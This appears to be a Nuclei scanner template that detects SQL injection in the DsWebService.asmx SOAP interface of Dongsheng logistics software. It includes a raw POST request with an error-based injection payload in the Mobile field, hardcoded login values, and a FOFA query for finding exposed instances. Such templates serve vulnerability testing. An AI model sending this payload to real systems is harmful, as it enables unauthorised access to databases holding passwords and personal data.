id: dongshengsoft-DsWebService-sqli
info:
  name: 东胜物流软件 DsWebService.asmx 多个SQL注入漏洞
  author: leadlife
  severity: high
  description: 东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 DsWebService.asmx 接口GetSeaiBsData、GetSeaeBsDataList、GetSeaeBsData和GetSeaiBsDataList、LoadCustomMainfastStatus、GetSeaiData等方法存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference: 
    - https://www.yuque.com/lvguo-pibd8/fqbwsx/xsg4igk8vid2t3ct
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
    tips:
    repair:
    version:
  tags: dongshengsoft,sqli

http:
  - raw:
      - |
        POST /Webservice/DsWebService.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
        Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/GetSeaiBsDataList"
        Content-Length: 629

        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
          <soap:Header/>
          <soap:Body>
              <dsw:GetSeaiBsDataList>
                <!--Optional:-->
                <dsw:LoginName>qdtaize</dsw:LoginName>
                <!--Optional:-->
                <dsw:LoginPass>EBBE3242-D49E-4398-BBFE-0133CA655EB5</dsw:LoginPass>
                <!--Optional:-->
                <dsw:Mobile>1&apos;)or 1&lt;@@version--</dsw:Mobile>
                <!--Optional:-->
                <dsw:Mblno>1</dsw:Mblno>
                <dsw:start>1</dsw:start>
                <dsw:limit>1</dsw:limit>
              </dsw:GetSeaiBsDataList>
          </soap:Body>
        </soap:Envelope>
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 500
          - contains_all(body,'Microsoft SQL Server')
        condition: and